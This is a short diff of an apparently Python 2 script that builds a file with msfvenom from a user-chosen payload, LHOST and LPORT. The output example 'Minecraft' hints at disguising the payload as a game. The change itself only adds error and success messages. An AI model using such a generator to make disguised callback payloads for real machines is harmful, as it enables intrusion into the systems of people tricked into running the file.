@@ -30,4 +30,8 @@ ex = raw_input(B+"Extension (ej: exe,jar,apk, etc): "+W)
 output = raw_input(G+"OUTPUT(ex: Minecraft):"+W)
 os.system("clear")
 banner()
-os.system("msfvenom -p "+payload+" LHOST="+host+" LPORT="+port+" -f "+ex+" -o "+output+"."+ex)
+command = os.system("msfvenom -p "+payload+" LHOST="+host+" LPORT="+port+" -f "+ex+" -o "+output+"."+ex)
+if command == 32512:
+	print(R+"[-] Error.")
+if command == 0:
+	print(G+"[INFO]"+W+" File Created: "+P+output+"."+ex)
